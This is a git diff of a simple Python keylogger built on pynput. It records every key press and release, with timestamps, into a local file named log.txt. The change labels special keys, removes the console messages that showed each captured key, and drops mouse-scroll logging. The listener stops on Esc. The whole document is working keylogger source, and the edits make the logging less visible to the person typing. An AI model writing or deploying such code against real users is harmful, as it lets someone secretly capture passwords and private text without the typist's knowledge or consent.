@@ -7,58 +7,47 @@ def keylogpressed(key):
 
     pressed = str(key)
     try:
-        pressed = key.char
-        print(f'Key pressed {pressed}')
+
+        if key == Key.space:
+            pressed = 'SPACE'
+            
+        elif key == Key.tab:
+            pressed = 'TAB'
+
+        elif key == Key.enter:
+            pressed = 'ENTER'
+
+        elif key == Key.shift:
+            pressed = 'SHIFT'
+
+        elif key == Key.backspace:
+            pressed = 'BACKSPACE'
+        else:
+            pressed = key.char
 
     except AttributeError:
-        pressed = 'special key {0} pressed'.format(key)
-        print(pressed)
+        pressed = f'SPECIAL {key}'
 
-
-    print(f'You entered {pressed}')
-
-    
     with open("log.txt", "a") as f:
         current_time = time()
-        f.write(f"Key pressed at ${current_time}     ${pressed}")
+        f.write(f"Key {pressed} pressed at ${current_time}")
 
     if key == Key.esc:
-        # Stop listener
         return False
 
 def keylogreleased(key):
 
-    released = '{0} released'.format(key)
-    
-
-
-    print(f'You released {released}')
-
+    released = f'{key}'
     
     with open("log.txt", "a") as f:
         current_time = time()
-        f.write(f"Key released at ${current_time}     ${released}")
+        f.write(f"Key {released} released at ${current_time}")
 
     if key == Key.esc:
-        # Stop listener
         return False
-
-def keylogscrolled(x, y, dx, dy):
-    scrolled = ""
-
-    with open("log.txt", "a") as f:
-        current_time = time()
-
-        if dy  < 0:
-            scrolled = "Down"
-
-        else:
-            scrolled = "Up"
-
-        f.write(f"Scrolled ${scrolled} at ${current_time}")
 
 
 
 # Collect all event until released
-with Listener(on_press = keylogpressed, on_release=keylogreleased,on_scroll=keylogscrolled) as listener:   
+with Listener(on_press = keylogpressed, on_release=keylogreleased) as listener:   
     listener.join()
